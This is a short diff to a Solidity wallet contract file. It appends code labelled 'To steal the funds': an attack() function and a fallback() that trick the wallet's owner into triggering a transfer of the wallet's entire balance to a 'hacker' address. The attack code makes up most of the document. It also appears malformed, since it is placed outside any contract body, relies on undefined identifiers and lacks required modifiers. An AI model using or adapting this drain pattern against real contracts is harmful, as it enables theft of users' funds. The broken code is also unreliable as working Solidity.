@@ -19,3 +19,18 @@ function transfer(address payable _to, uint _amount) public {
           require(sent, "Failed to send Ether");
      }
 }
+
+// To steal the funds:
+ 
+   // Make the Owner of Wallet call this function:
+   function attack() public {
+       // Transfer Wallet's funds to the hacker
+       wallet.transfer(hacker, address(wallet).balance);
+   }
+ 
+   // Or make the owner send some Eth to this contract's address
+   // which will trigger fallback() like this:
+   fallback() payable {
+       // Transfer Wallet's funds to the hacker
+       wallet.transfer(hacker, address(wallet).balance);
+   }   
